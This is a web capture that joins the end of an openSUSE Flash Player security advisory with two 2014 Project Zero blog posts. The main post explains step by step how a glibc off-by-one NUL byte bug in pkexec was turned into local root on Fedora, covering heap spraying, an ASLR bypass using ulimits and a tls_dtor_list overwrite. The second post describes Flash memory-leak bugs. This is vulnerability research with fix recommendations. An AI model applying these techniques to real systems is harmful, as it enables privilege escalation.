<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0552>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0552%3E)
\* CVE-2014-0553
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0553>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0553%3E)
\* CVE-2014-0554
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0554>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0554%3E)
\* CVE-2014-0555
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0555>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0555%3E)
\* CVE-2014-0556
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0556>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0556%3E)
\* CVE-2014-0557
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0557>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0557%3E)
\* CVE-2014-0559
<[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0559>](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0559%3E)
Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE Linux Enterprise Desktop 11 SP3:
zypper in -t patch sledsp3-flash-player-9704
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE Linux Enterprise Desktop 11 SP3 (i586 x86\_64) [New Version: 11.2.202.406]:
flash-player-11.2.202.406-0.3.1
flash-player-gnome-11.2.202.406-0.3.1
flash-player-kde4-11.2.202.406-0.3.1
References:
<http://support.novell.com/security/cve/CVE-2014-0547.html>
<http://support.novell.com/security/cve/CVE-2014-0548.html>
<http://support.novell.com/security/cve/CVE-2014-0549.html>
<http://support.novell.com/security/cve/CVE-2014-0550.html>
<http://support.novell.com/security/cve/CVE-2014-0551.html>
<http://support.novell.com/security/cve/CVE-2014-0552.html>
<http://support.novell.com/security/cve/CVE-2014-0553.html>
<http://support.novell.com/security/cve/CVE-2014-0554.html>
<http://support.novell.com/security/cve/CVE-2014-0555.html>
<http://support.novell.com/security/cve/CVE-2014-0556.html>
<http://support.novell.com/security/cve/CVE-2014-0557.html>
<http://support.novell.com/security/cve/CVE-2014-0559.html>
<https://bugzilla.novell.com/895856>
[http://download.suse.com/patch/finder/?keywords=3bb66ba5895adc6dc1e2753dafc4...](http://download.suse.com/patch/finder/?keywords=3bb66ba5895adc6dc1e2753dafc4a3e3)
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7/#QNMDKMT2BAFV54Z53CNOUKMWDOIXXVW7)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from googleprojectzero.blogspot.com_73be423c_20250126_083224.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Monday, August 25, 2014

### [The poisoned NUL byte, 2014 edition](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html)

Posted by Chris Evans, Exploit Writer Underling to Tavis Ormandy

Back in [this 1998 post to the Bugtraq mailing list](http://seclists.org/bugtraq/1998/Oct/109), Olaf Kirch outlined an attack he called “The poisoned NUL byte”. It was an off-by-one error leading to writing a NUL byte outside the bounds of the current stack frame. On i386 systems, this would clobber the least significant byte (LSB) of the “saved %ebp”, leading eventually to code execution. Back at the time, people were surprised and horrified that such a minor error and corruption could lead to the compromise of a process.

Fast forward to 2014. Well over a month ago, Tavis Ormandy of Project Zero [disclosed a glibc NUL byte off-by-one overwrite into the heap](https://sourceware.org/bugzilla/show_bug.cgi?id=17187). Initial reaction was [skepticism about the exploitability of the bug](http://www.openwall.com/lists/oss-security/2014/07/21/8), on account of the malloc metadata hardening in glibc. In situations like this, the Project Zero culture is to sometimes “wargame” the situation. geohot quickly coded up a challenge and we were able to gain code execution. Details are captured [in our public bug](https://code.google.com/p/google-security-research/issues/detail?id=96). This bug contains analysis of a few different possibilities arising from an off-by-one NUL overwrite, a solution to the wargame (with comments), and of course a couple of different variants of a full exploit (with comments) for a local Linux privilege escalation.

Inspired by the success of the wargame, I decided to try and exploit a real piece of software. I chose the “pkexec” setuid binary as used by Tavis to demonstrate the bug. The goal is to attain root privilege escalation. Outside of the wargame environment, it turns out that there are a series of very onerous constraints that make exploitation hard. I did manage to get an exploit working, though, so read on to see how.

Step 1: Choose a target distribution

I decided to develop against Fedora 20, 32-bit edition. Why the 32-bit edition? I’m not going to lie: I wanted to give myself a break. I was expecting this to be pretty hard so going after the problem in the 32-bit space gives us just a few more options in our trusty exploitation toolkit.

Why Fedora and not, say, Ubuntu? Both ship pkexec by default. Amusingly, Ubuntu has deployed the fiendish mitigation called the “even path prefix length” mitigation. Kudos! More seriously, there is a malloc() that is key to the exploit, in gconv\_trans.c:\_\_gconv\_translit\_find():

     newp = (struct known\_trans \*) malloc (sizeof (struct known\_trans)
                                            + (\_\_gconv\_max\_path\_elem\_len
                                               + name\_len + 3)
                                            + name\_len);

If \_\_gconv\_max\_path\_elem\_len is even, then the malloc() size will be odd. An odd malloc() size will always result in an off-by-one off the end being harmless, due to malloc() minimum alignment being sizeof(void\*).

On Fedora, \_\_gconv\_max\_path\_elem\_len is odd due to the value being /usr/lib/gconv/ (15) or /usr/lib64/gconv/ (17). There are various unexplored avenues to try and influence this value on Ubuntu but for now we choose to proceed on Fedora.

Step 2: Bypass ASLR

Let’s face it, ASLR is a headache. On Fedora 32-bit, the pkexec image, the heap and the stack are all randomized, including relative to each other, e.g.:

b772e000-b7733000 r-xp 00000000 fd:01 4650        /usr/bin/pkexec
b8e56000-b8e77000 rw-p 00000000 00:00 0           [heap]
bfbda000-bfbfb000 rw-p 00000000 00:00 0           [stack]

There is often a way to defeat ASLR, but as followers of the path of least resistance, what if we could just bypass it altogether? Well, what happens if we run pkexec again after running the shell commands ulimit -s unlimited and ulimit -d 1 ? These altered limits to stack and data sizes are inherited across processes, even setuid ones:

40000000-40005000 r-xp 00000000 fd:01 9909        /usr/bin/pkexec
406b9000-407bb000 rw-p 00000000 00:00 0           /\* mmap() heap \*/
bfce5000-bfd06000 rw-p 00000000 00:00 0           [stack]

This is much better. The pkexec image and libraries, as well as the heap, are now in static locations. The stack still moves around, with about 8MB variation (or 11 bits of entropy if you prefer), but we already know static locations for both code and data without needing to know the exact location of the stack.

(For those curious about the effect of these ulimits on 64-bit ASLR, the situation isn’t as bad there. The binary locations remain well randomized. The data size trick is still very useful, though: the heap goes from a random location relative to the binary, to a static offset relative to the binary. This represents a significant reduction in entropy for some brute-force scenarios.)

Step 3: Massage the heap using just command line arguments and the environment

After significant experimentation, our main heap massaging primitive is to call pkexec with a path comprising of ‘/’ followed by 469 ‘1’ characters. This path does not exist, so an error message including this path is built. The eventual error message string is a 508-byte allocation, occupying a 512-byte heap chunk on account of 4 bytes of heap metadata. The error message is built using an algorithm that starts with a 100-byte allocation. If the allocation is not large enough, it is doubled in size, plus 100 bytes, and the old allocation is freed after a suitable copy. The final allocation is shrunk to precise size using realloc. Running the full sequence through for our 508-byte string, we see the following heap API calls:

malloc(100), malloc(300), free(100), malloc(700), free(300), realloc(508)

By the time we get to this sequence, we’ve filled up all the heap “holes” so that these allocations occur at the end of the heap, leading to this heap layout at the end of the heap (where “m” means metadata and a red value shows where the corruption will occur):

| free space: 100 |m| free space: 300 |m| error message: 508 bytes |

In fact, the heap algorithm will have coalesced the 100 and 300 bytes of free space. Next, the program proceeds to consider character set conversion for the error message. This is where the actual NUL byte heap overflows occurs, due to our CHARSET=//AAAAA… environment variable. Leading up to this, a few small allocations outside of our control occur. That’s fine; they stack up at the beginning of the coalesced free space. An allocation based on our CHARSET environment variable now occurs. We choose the number of A’s in our value to cause an allocation of precisely 236 bytes, which perfectly fills the remaining space in the 400 bytes of free space. The situation now looks like this:

| blah |m| blah |m| charset derived value: 236 bytes |m: 0x00000201| error message: 508 bytes |

The off-by-one NUL byte heap corruption now occurs. It will clobber the LSB of the metadata word that precedes the error message allocation. The format of metadata is a size word, with a couple of flags in the two least significant bits. The flag 0x1, which is set, indicates that the previous buffer, the charset derived value, is in use. The size is 0x200, or 512 bytes. This size represents the 508 bytes of the following allocation plus 4 bytes of metadata. The size and flag values at this time are very specifically chosen so that the single NUL byte overflow only has the effect of clearing the 0x1 in use flag. The size is unchanged, which is important later when we need to not break forward coalescing during free().

Step 4: Despair

The fireworks kick off when the error message is freed as the program exits. We have corrupted the preceding metadata to make it look like the previous heap chunk is free when in fact it is not. Since the previous chunk looks free, the malloc code attempts to coalesce it with the current chunk being freed. When a chunk is free, the last 4 bytes represent the size of the free chunk. But the chunk is not really free; so what does it contain as its last 4 bytes? Those bytes will be interpreted as a size. It turns out that as an attacker, we have zero control over these last 4 bytes: they are always 0x6f732e00, or the string “.so” preceded by a NUL byte.

Obviously, this is a very large size. And unfortunately it is used as an index backwards in memory in order to find the chunk header structure for the previous chunk. Since our heap is in the 0x40000000 range, subtracting 0x6f732e00 ends us up in the 0xd0000000 range. This address is in kernel space so when we dereference it as a chunk header structure, we get a crash and our exploitation dreams go up in smoke.

At this juncture, we consider alternate heap metadata corruption situations, in the hope we will find a situation where we have more control:

1. Forward coalescing of free heap chunks. If we cause the same corruption as described above, but arrange to free the chunk preceding the overflowed chunk, we follow a different code path. It results in the beginning of the 236-byte allocation being treated as a pair of freelist pointers for a linked list operation. This sounds initially promising, but again, we do not seem to have full control over the these values. In particular, the second freelist pointer comes out as NULL (guaranteed crash) and it is not immediately obvious how to overlap a non-NULL value there.
2. Overflowing into a free chunk. This opens up a whole range of possibilities. Unfortunately, our overflow is a NUL byte so we can only make free chunks smaller and not bigger, which is a less powerful primitive. But we can again cause confusion as to the location of heap metadata headers. See “shrink\_free\_hole\_consolidate\_backward.c” [in our public bug](https://code.google.com/p/google-security-research/issues/detail?id=96). Again, we are frustrated because we do not have obvious control over the first bytes of any malloc() object that might get placed into the free chunk after we have corrupted the following length.
3. Overflowing into a free chunk and later causing multiple pointers to point to the same memory. This powerful technique is covered in “shrink\_free\_hole\_alloc\_overlap\_consolidate\_backward.c” [in our public bug](https://code.google.com/p/google-security-research/issues/detail?id=96). I didn’t investigate this path because the required precise sequence of heap operations did not seem readily possible. Also, the memory corruption occurs after the process has hit an error and is heading towards exit(), so taking advantage of pointers to overlapping memory will be hard.

At this stage, things are looking bad for exploitation.

Step 5: Aha! use a command-line argument spray to effect a heap spray and collide the heap into the stack

The breakthrough to escape the despair of step 4 comes when we discover a memory leak in the pkexec program; from pkexec.c:

     else if (strcmp (argv[n], "--user") == 0 || strcmp (argv[n], "-u") == 0)
        {
          n++;
          if (n >= (guint) argc)
            {
              usage (argc, argv);
              goto out;
            }

          opt\_user = g\_strdup (argv[n]);
        }

This is very useful! If we specify multiple “-u” command line arguments, then we will spray the heap, because setting a new opt\_user value does not consider freeing the old one.

Furthermore, we observe that modern Linux kernels [permit a very large number of command-line arguments](http://lxr.free-electrons.com/source/include/uapi/linux/binfmts.h) to be passed via execve(), with each one able to be up to 32 pages long.

We opt to pass a very large number (15 million+) of “-u” command line argument values, each a string of 59 bytes in length. 59 bytes plus a NUL terminator is a 60 byte allocation, which ends up being a 64 byte heap chunk when we include metadata. This number is important later.

The effect of all these command line arguments is to bloat both the stack (which grows down) and the heap (which grows up) until they crash into each other. In response to this collision, the next heap allocations actually go above the stack, in the small space between the upper address of the stack and the kernel space at 0xc0000000. We use just enough command line arguments so that we hit this collision, and allocate heap space above the stack, but do not quite run out of virtual address space -- this would halt our exploit! Once we’ve caused this condition, our tail-end mappings look a bit like this:

407c8000-7c7c8000 rw-p 00000000 00:00 0       /\* mmap() based heap \*/
7c88e000-bf91c000 rw-p 00000000 00:00 0       [stack]
bf91c000-bff1c000 rw-p 00000000 00:00 0       /\* another mmap() heap extent \*/

Step 6: Commandeer a malloc metadata chunk header

The heap corruption listed in step 3 now plays out in a heap extent that is past the stack. Why did we go to all this effort? Because it avoids the despair in step 4. The huge backwards index of 0x63732e00 now results in an address that is mapped! Specifically, it will hit somewhere around the 0x50700000 range, squarely in the middle of our heap spray. We control the content at this address.

At this juncture, we encounter the first non-determinism in our exploit. This is of course a shame as we deployed quite a few tricks to avoid randomness. But, by placing a heap extent past the stack, we’ve fallen victim to stack randomization. That’s one piece of randomization we were not able to bypass. By experimental determination, the top of the stack seems to range from 0xbf800000-0xbffff000, for 2048 (2^11) different possibilities with 4k (PAGE\_SIZE) granularity.

A brief departure on exploit reliability. As we spray the heap, the heap grows in mmap() extents of size 1MB. There is no control over this. Therefore, there’s a chance that the stack will randomly get mapped sufficiently high that a 1MB mmap() heap extent cannot fit above the stack. This will cause the exploit to fail about 1 in 8 times. Since the exploit is a local privilege escalation and takes just a few seconds, you can simply re-run it.

In order to get around this randomness, we cater for every possible stack location in the exploit. The backwards index to a malloc chunk header will land at a specific offset into any one of 2048 different pages. So we simply forge a malloc chunk header at all of those locations. Whichever one hits by random, our exploit will continue in a deterministic manner by using the same path forward. At this time, it’s worth noting why we sprayed the heap with 59-byte strings. These end up spaced 64 bytes apart. Since 64 is a perfect multiple of PAGE\_SIZE (4096), we end up with a very uniform heap spray pattern. This gives us two things: an easy calculation to map command line arguments to an address where the string will be placed in the heap, and a constant offset into the command line strings for where we need to place the forged heap chunk payload.

Step 7: Clobber the tls\_dtor\_list

So, we have now progressed to the point where we corrupt memory such that a free() call will end up using a faked malloc chunk header structure that we control. In order to further progress, we abuse freelist linked list operations to write a specific value to a specific address in memory. Let’s have a look at the malloc.c code to remove a pointer from a doubly-linked freelist:

#define unlink(AV, P, BK, FD) {                                        \
[...]
  if (\_\_builtin\_expect (FD->bk != P || BK->fd != P, 0)) {              \
    mutex\_unlock(&(AV)->mutex);                                        \
    malloc\_printerr (check\_action, "corrupted double-linked list", P); \
    mutex\_lock(&(AV)->mutex);                                          \
  } else {                                                             \
    if (!in\_smallbin\_range (P->size)                                   \
        && \_\_builtin\_expect (P->fd\_nextsize != NULL, 0)) {             \
      assert (P->fd\_nextsize->bk\_nextsize == P);                       \
      assert (P->bk\_nextsize->fd\_nextsize == P);                       \
      if (FD->fd\_nextsize == NULL) {                                   \
[...]
      } else {                                                         \
        P->fd\_nextsize->bk\_nextsize = P->bk\_nextsize;                  \
        P->bk\_nextsize->fd\_nextsize = P->fd\_nextsize;                  \
[...]

We see that the main doubly linked list is checked in a way that makes it hard for us to write to arbitrary locations. But the special doubly linked list for larger allocations has only some debug asserts for the same type of checks. (Aside: there’s some evidence that Ubuntu glibc builds might compile these asserts in, even for release builds. Fedora certainly does not.) So we craft our fake malloc header structure so that the main forward and back pointers point back to itself, and so that the size is large enough to enter the secondary linked list manipulation. This bypasses the main linked list corruption check, but allows us to provide arbitrary values for the secondary linked list. These arbitrary values let us write an arbitrary 4-byte value to an arbitrary 4-byte address, but with a very significant limitation: the value we write must itself be a valid writeable address, on account of the double linking of the linked list. i.e. after we write our arbitrary value of P->bk\_nextsize to P->fd\_nextsize, the value P->bk\_nextsize is itself dereferenced and written to.

This limitation does provide a headache. At this point in the process’ lifetime, it is printing an error message just before it frees a few things up and exits. There are not a huge number of opportunities to gain control of code execution, and our corruption primitive does not let us directly overwrite a function pointer with another, different pointer to code. To get around this, we note that there are two important glibc static data structure pointers that indirectly control some code that gets run during the exit() process: \_\_exit\_funcs and tls\_dtor\_list. \_\_exit\_funcs does not work well for us because the structure contains an enum value that has to be some small number like 0x00000002 in order to be useful to us. It is hard for us to construct fake structures that contain NUL bytes in them because our building block is the NUL-terminated string. But tls\_dtor\_list is ideal for us. It is a singly linked list that runs at exit() time, and for every list entry, an arbitrary function pointer is called with an arbitrary value (which has to be a pointer due to previous contraints)! It’s an easy version of ROP.

Step 8: Deploy a chroot() trick

For our first attempt to take control of the program, we simply call system(“/bin/bash”). This doesn’t work because this construct ends up dropping privileges. It is a bit disappointing to go to so much trouble to run arbitrary code, only to end up with a shell running at our original privilege level.

The deployed solution is to chain in a call to chroot() before the call to system(). This means that when system() executes /bin/sh, it will do so inside a chroot we have set up to contain our own /bin/sh program. Inside our fake /bin/sh, we will end up running with effective root privilege. So we switch to real root privilege by calling setuid(0) and then execute a real shell.

TL;DR: Done! We escalated from a normal user account to root privileges.

Step 9: Tea and medals; reflect

The main point of going to all this effort is to steer industry narrative away from quibbling about whether a given bug might be exploitable or not. In this specific instance, we took a very subtle memory corruption with poor levels of attacker control over the overflow, poor levels of attacker control over the heap state, poor levels of attacker control over important heap content and poor levels of attacker control over program flow.

Yet still we were able to produce a decently reliable exploit! And there’s a long history of this over the evolution of exploitation: proclamations of non-exploitability that end up being neither advisable nor correct. Furthermore, arguments over exploitability burn time and energy that could be better spent protecting users by getting on with shipping fixes.

Aside from fixing the immediate glibc memory corruption issue, this investigation led to additional observations and recommendations:

* Memory leaks in setuid binaries are surprisingly dangerous because they can provide a heap spray primitive. Fixing the pkexec memory leak is recommended.
* The ability to lower ASLR strength by running setuid binaries with carefully chosen ulimits is unwanted behavior. Ideally, setuid programs would not be subject to attacker-chosen ulimit values. There’s a long history of attacks along these lines, such as this recent [file size limit attack](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1675). Other unresolved issues include the ability to fail specific allocations or fail specific file opens via carefully chosen RLIMIT\_AS or RLIMIT\_NOFILE values.
* The exploit would have been complicated significantly if the malloc main linked listed hardening was also applied to the secondary linked list for large chunks. Elevating the assert() to a full runtime check is recommended.
* We also noticed a few environment variables that give the attacker unnecessary options to control program behavior, e.g. [G\_SLICE](https://developer.gnome.org/glib/stable/glib-running.html) letting the attacker control properties of memory allocation. There have been interesting historical instances where controlling such properties assisted exploitation such as [this traceroute exploit from 2000](http://seclists.org/bugtraq/2000/Oct/84). We recommend closing these newer routes too.

I hope you enjoyed this write-up as much as I enjoyed developing the exploit! There’s probably a simple trick that I’ve missed to make a much simpler exploit. If you discover that this is indeed the case, or if you pursue a 64-bit exploit, please get in touch! For top-notch work, we’d love to feature a guest blog post.

Posted by
Anonymous

at

[6:59 PM](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html "permanent link")

[23 comments:](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=3269994653990393776&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=3269994653990393776&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=3269994653990393776&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=3269994653990393776&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=3269994653990393776&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=3269994653990393776&target=pinterest "Share to Pinterest")

## Thursday, August 21, 2014

### [What does a pointer look like, anyway?](https://googleprojectzero.blogspot.com/2014/08/what-does-pointer-look-like-anyway.html)

Posted by Chris Evans, Renderer of Modern Art

In Adobe’s [August 2014 Flash Player security update](http://helpx.adobe.com/security/products/flash-player/apsb14-18.htmlhttp%3A//helpx.adobe.com/security/products/flash-player/apsb14-18.html), we see:

These updates resolve memory leakage vulnerabilities that could be used to bypass memory address randomization (CVE-2014-0540, CVE-2014-0542, CVE-2014-0543, CVE-2014-0544, CVE-2014-0545).

I reported the latter four of these. I’d like to thank Adobe for fixing them so quickly -- about 30 days between report and broad availability of a patch. That’s well within Project Zero’s 90-day deadline on bug disclosure.
They are all interesting bugs in image decoding, leading to uninitialized pixels in image canvases. There exist rich ActionScript APIs to read pixels out of canvases, so any uninitialized data can be examined easily by the attacker. Let’s take a visual tour of the four bugs:

CVE-2014-0542  [[link to our public bug](https://code.google.com/p/google-security-research/issues/detail?id=44)]
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKCipDgYB3HmlLwqXvUBs-lB-EvLDBfu2r0DzOiVZae3db_xuHzVZI1HLjOhjU1gVXjRGa_HnvMlT4YaymIocXP9GbdkxXL1yf6xTuUtTYDhJeby3emIpSVyprBfrKPZ-gZLkmYIEH7pIdkJDvgb2GHcpjhZy0hFuWG9JBWqaApW_regQeaf3XtrRm/s550/pointer1-flashleak.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKCipDgYB3HmlLwqXvUBs-lB-EvLDBfu2r0DzOiVZae3db_xuHzVZI1HLjOhjU1gVXjRGa_HnvMlT4YaymIocXP9GbdkxXL1yf6xTuUtTYDhJeby3emIpSVyprBfrKPZ-gZLkmYIEH7pIdkJDvgb2GHcpjhZy0hFuWG9JBWqaApW_regQeaf3XtrRm/s550/pointer1-flashleak.png)
The image above, which includes the “got probable pointer” text, is a sample rendering from running the proof of concept file. The trigger for this bug is a particularly weird JPEG image: one with two color components per pixel. Most images have one component per pixel (greyscale) or three components per pixel (red, green, blue or other scheme). In the case of two color components, the image processing “gave up” on rendering the foreign image. This left completely uninitialized RGB (red, green, blue) values in the canvas, thus leaking the contents of the memory that was last allocated where the new canvas now is.

If you look at the probable pointer value, you’ll see that one byte is marked as “??”. This is because the canvas is in fact RGBA (red, green, blue, alpha) and the alpha component -- which is every fourth byte -- is initialized to a constant 0xff value.
CVE-2014-0543  [[link to our public bug](https://code.google.com/p/google-security-research/issues/detail?id=45)]
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuvWUHoEcx7r79A0dP9qwcBgYKK7ebcsK1TUW0bdl_gMuz7UmxQOFA-kadvDKGCZyv4J5zHImcyl5pI9SplpZy_0eD5fT0G26bELhJr8feXl599gvPnPa35gGn0nP9WkJF12My4V__ZoRq2euqtnjPmU_VsaA8_ZlMlHv8I8sw0ehwk0FnhoZ2AXkM/s564/pointer2-1bpp.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuvWUHoEcx7r79A0dP9qwcBgYKK7ebcsK1TUW0bdl_gMuz7UmxQOFA-kadvDKGCZyv4J5zHImcyl5pI9SplpZy_0eD5fT0G26bELhJr8feXl599gvPnPa35gGn0nP9WkJF12My4V__ZoRq2euqtnjPmU_VsaA8_ZlMlHv8I8sw0ehwk0FnhoZ2AXkM/s564/pointer2-1bpp.png)
The trigger for this bug is a 1bpp image. 1bpp is shorthand for “one bit per pixel”. If we just have 1 bit to represent every pixel, the image should only contain two different colors, one color for pixels where the bit is 0 and another color for pixels where the bit is 1.

Looking at the image, we have a rich range of colors so right away we know something is wrong. What has happened here is that 1bpp images can be declared in a SWF image tag, but they are not supported. Upon hitting the unsupported image, the per-row conversion code “gives up”, leaving the row buffer uninitialized. Since there is just one row buffer (it is reused every row), the image looks very distinct. Every row is the same.

The long hexadecimal number below the image represents a bit of uninitialized data pulled out of the image canvas and into script.
CVE-2014-0544  [[link to our public bug](https://code.google.com/p/google-security-research/issues/detail?id=47)]
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuZHZgZ01_VUiF8-7X-wHepZHeT8E7ynfRoUgIvhxVm2Bkaxm_3EWlkLQeIjCmuB_TL3rYIexuxiM3dO6nEjPMS4H-lEHvMxrm4DKdHiBLmOcE0EQDpGzPvapteTCekCLj1nOS7NskrtLM3yS13INw-_WQSDHN3CE9Sks7FlN6MjApG8e0yhxkhuv_/s600/pointer3-8bppleak.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuZHZgZ01_VUiF8-7X-wHepZHeT8E7ynfRoUgIvhxVm2Bkaxm_3EWlkLQeIjCmuB_TL3rYIexuxiM3dO6nEjPMS4H-lEHvMxrm4DKdHiBLmOcE0EQDpGzPvapteTCekCLj1nOS7NskrtLM3yS13INw-_WQSDHN3CE9Sks7FlN6MjApG8e0yhxkhuv_/s649/pointer3-8bppleak.png)
This bug resolves the question “what does a pointer look like?” the most definitively. It also leaks contiguous uninitialized memory very clearly, making it the most powerful leak yet. There is no “??” in the extracted pointer value, because there is no uncertainty.

The bug works by rendering image pixels that are compressed via the zlib compression algorithm. This particular image is a 64x64 canvas, which requires 4096 pixels to fill. The trick we pull is to terminate the zlib stream immediately, after emitting exactly 0 pixels. This leaves the canvas… you guessed it… uninitialized.

If you look at the image, you’ll notice it appears to be comprised of columns. This effect is because the width is 64 pixels, and a pointer is 8 bytes (these images are all rendered on 64-bit Linux). Since 64 is an exact multiple of the pointer size, any pointers will be nicely aligned. And this image is chock full of pointers. A pointer value on 64-bit Linux is particularly visible because the two most significant bytes are zero (rendered as black), leading to distinct vertical black bars.
CVE-2014-0545  [[link to our public bug](https://code.google.com/p/google-security-research/issues/detail?id=48)]
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5pyqOBxsrr_1nu3zv4HAX5KwesgG3MIHfSMZn8qyPPpRRFrxChrPH-OYUgWJjZq6BE4X0-syeJ5mbi2aRgwHriyCyiy-kbuR87mPswNdNHYHcFZDyWoogly9KKIFtSdFJtNp_yN_f4cbPWa9AzmTWGgsW9GCyh_z0tg5FKhuJ_NrxREoF8uEwQVZV/s600/pointer4-jpgalpha.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5pyqOBxsrr_1nu3zv4HAX5KwesgG3MIHfSMZn8qyPPpRRFrxChrPH-OYUgWJjZq6BE4X0-syeJ5mbi2aRgwHriyCyiy-kbuR87mPswNdNHYHcFZDyWoogly9KKIFtSdFJtNp_yN_f4cbPWa9AzmTWGgsW9GCyh_z0tg5FKhuJ_NrxREoF8uEwQVZV/s660/pointer4-jpgalpha.png)
This final bug is also a very powerful memory leak, as evidenced by the complete pointer value extracted. It also works by embedding truncated zlib stream in the image. In this case, the truncated zlib stream (again truncated a 0 pixels) is for the image’s alpha channel. By extracting only the alpha channel byte values from the rendered image, we can recover the content of contiguous uninitialized memory.

Conclusion

My personal conclusion is that there’s a strange beauty to the visualization of uninitialized memory and pointer values. I hope you enjoyed these slightly unusual bugs.

Posted by
Anonymous

at

[3:03 PM](https://googleprojectzero.blogspot.com/2014/08/what-does-pointer-look-like-anyway.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2014/08/what-does-pointer-look-like-anyway.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=8282643194516545519&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8282643194516545519&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8282643194516545519&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8282643194516545519&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8282643194516545519&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=8282643194516545519&target=pinterest "Share to Pinterest")

[Newer Posts](https://googleprojectzero.blogspot.com/search?updated-max=2014-10-01T15:58:00-07:00&max-results=1&reverse-paginate=true "Newer Posts")

[Older Posts](https://googleprojectzero.blogspot.com/search?updated-max=2014-08-21T15:03:00-07:00&max-results=1 "Older Posts")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://googleprojectzero.blogspot.com/feeds/posts/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
